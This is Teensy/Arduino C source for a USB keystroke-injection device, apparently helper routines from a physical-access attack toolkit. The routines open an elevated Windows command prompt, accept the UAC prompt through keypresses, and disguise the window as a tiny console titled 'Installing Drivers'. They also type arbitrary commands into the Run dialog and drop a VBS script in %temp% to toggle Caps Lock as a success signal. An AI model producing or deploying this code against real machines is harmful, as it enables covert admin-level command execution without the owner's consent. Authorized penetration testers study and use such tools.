void wait_for_drivers(int sleep)
{
    bool CapsLockTrap = is_caps_on();
    while(CapsLockTrap == is_caps_on())
    {
        delay(sleep);
        Keyboard.set_key1(KEY_CAPS_LOCK);
        Keyboard.send_now();
        Keyboard.set_modifier(0);
        Keyboard.set_key1(0);
        Keyboard.send_now();
        delay(200);
    }
}

int ledkeys(void) {return int(keyboard_leds);}

bool is_caps_on(void) {return ((ledkeys() & 2) == 2) ? true : false;}

bool cmd_admin(int reps, int millisecs)
{
    make_sure_capslock_is_on();
    delay(700);
    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
    Keyboard.send_now();
    Keyboard.set_modifier(0);
    Keyboard.send_now();
    delay(3000);
    Keyboard.print("cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\"");
    delay(2000);
    Keyboard.set_modifier(MODIFIERKEY_CTRL);
    Keyboard.send_now();
    Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
    Keyboard.send_now();
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(200);
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(500);
    delay(7000);
    send_left_enter();
    delay(4000);
    create_click_capslock_win();
    check_for_capslock_success_teensy(reps,millisecs);
}

bool cmd(int reps, int millisecs, char *SomeCommand)
{
    make_sure_capslock_is_on();
    delay(700);
    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
    Keyboard.set_key1(KEY_R);
    Keyboard.send_now();

    delay(500);
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();

    Keyboard.print(SomeCommand);
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();

    Keyboard.set_key1(0);
    Keyboard.send_now();

    delay(3000);
    create_click_capslock_win();
    check_for_capslock_success_teensy(reps,millisecs);
}

void make_sure_capslock_is_on(void)
{
    if (!is_caps_on())
    {
        Keyboard.set_key1(KEY_CAPS_LOCK);
        Keyboard.send_now();
        Keyboard.set_modifier(0);
        Keyboard.set_key1(0);
        Keyboard.send_now();
        delay(200);
    }
}

void create_click_capslock_win()
{
	make_sure_capslock_is_on();
    Keyboard.println("echo Set WshShell = WScript.CreateObject(\"WScript.Shell\"): WshShell.SendKeys \"{CAPSLOCK}\" > %temp%\\\\capslock.vbs");
    delay(400);
    Keyboard.println("wscript %temp%\\\\capslock.vbs");
    delay(2000);
}

bool check_for_capslock_success_teensy(int reps, int millisecs)
{
    unsigned int i = 0;
    do
    {
        delay(millisecs);
        if (!is_caps_on())
        {
            make_sure_capslock_is_on();
            return true;
        }
        i++;
    }
    while (is_caps_on() && (i<reps));
    return false;
}

void minimise_windows(void)
{
    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
    Keyboard.set_key1(KEY_M);
    Keyboard.send_now();
    delay(300);
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(500);
    delay(300);
}

void reset_windows_desktop(int sleep)
{
    delay(1000);
    minimise_windows();
    delay(sleep);
    minimise_windows();
    delay(sleep);
    minimise_windows();
    delay(200);
}

void send_left_enter(){
    delay(1000);
    Keyboard.set_key1(KEY_LEFT);
    Keyboard.send_now();
    delay(100);
    Keyboard.set_key1(0);
    Keyboard.send_now();

    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);
    Keyboard.set_key1(0);
    Keyboard.send_now();
}

